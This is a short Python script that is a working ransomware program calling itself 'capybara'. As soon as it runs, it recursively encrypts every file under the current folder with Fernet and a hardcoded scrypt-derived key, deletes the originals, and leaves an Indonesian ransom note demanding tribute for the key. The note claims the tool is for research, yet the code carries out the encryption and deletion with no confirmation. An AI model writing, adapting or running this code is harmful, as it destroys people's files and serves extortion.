import pathlib
import os
import base64

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

def generate_key(password=123):
    salt = b"raja capybara agung"
    derived_key = derive_key(salt, str(password))
    return base64.urlsafe_b64encode(derived_key)

def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # create the encrypted file name
    encrypted_filename = str(filename) + ".capybara"
    # write the encrypted file
    with open(encrypted_filename, "wb") as file:
        file.write(encrypted_data)
    # remove the original file
    os.remove(filename)
    print(f"Encrypted {filename} to {encrypted_filename}")

def encrypt_folder(folder="./", key=generate_key(123)):
    # if it's a folder, encrypt the entire folder (i.e all the containing files)
    for child in pathlib.Path(folder).glob("*"):
        if child.is_file():
            if (
                child.name == "capybara-encrypt.exe" or child.name == "capybara-decrypt.exe" or child.name == "capybara-encrypt.py" or child.name == "capybara-decrypt.py"
            ):  # Skip file with specific name "salt.capybara"
                print(f"[!] Skipping {child}")
            else:
                print(f"[*] Encrypting {child}")
                # encrypt the file
                encrypt(child, key)
        elif child.is_dir():
            # if it's a folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)

    with open("informasi ransomware capybara.txt", "w") as file:
        file.write(
            """PERINGATAN!!!
Ransomeware ini dibuat oleh Raja Capybara untuk tujuan penelitian, jangan asal digunakan.
Kalau terlanjur digunakan maka hanya Raja Capybara yang bisa memberikan kunci untuk mengembalikan file yang terenkripsi.
Syarat untuk mendapatkannya harus sungkem ke Raja Capybara serta harus membawakan upeti.

*Upeti apapun diterima
            """
        )

    print("Created decrypt.py")

encrypt_folder()
